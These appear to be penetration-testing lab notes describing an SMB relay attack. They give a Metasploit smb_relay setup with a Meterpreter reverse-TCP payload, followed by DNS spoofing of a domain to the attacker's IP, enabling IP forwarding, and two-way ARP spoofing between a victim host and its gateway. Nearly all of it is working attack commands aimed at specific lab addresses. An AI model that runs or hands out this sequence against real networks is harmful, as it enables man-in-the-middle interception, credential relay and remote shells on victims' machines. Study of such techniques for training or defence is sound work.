# 3 SMB Relay Attack

```msf
msfconsole
search smb_relay
use 0
set SRVHOST <kali linux IP
LHOST <same>
set SMBHOST 172.16.5.10
set PAYLOAD windows/meterpreter/reverse_tcp

```

Doing DNS spoofing: To redirect the victim to meterpreter system.

```linux
echo "172.16.5.101 *.sportsfoo.com" > dns.txt
```
Creates fake DNS record:
- Any request for `*.sportsfoo.com`
- Redirects to attacker IP (`172.16.5.101`)
specifying the kali linux IP
that should resolves to the domain `sportsfool` or sub domain associated with Top level domain


```linux1
dnsspoof -i eth1 -f dns.txt
```
Now victim DNS queries are redirected to attacker

New tab: 
Enable IP Forwarding
```linux2
echo 1 > /proc/sys/net/ipv4/ip_forward
```
- Allows Kali to forward traffic
- Required for MITM attack to avoid breaking connectivity

New tab:
ARP Spoofing (MITM Positioning)
```linux2
arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
```
Pretend to victim (`172.16.5.5`) that attacker is the gateway (`172.16.5.1`)

```linux3
arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
```
Pretend to gateway that attacker is the victim
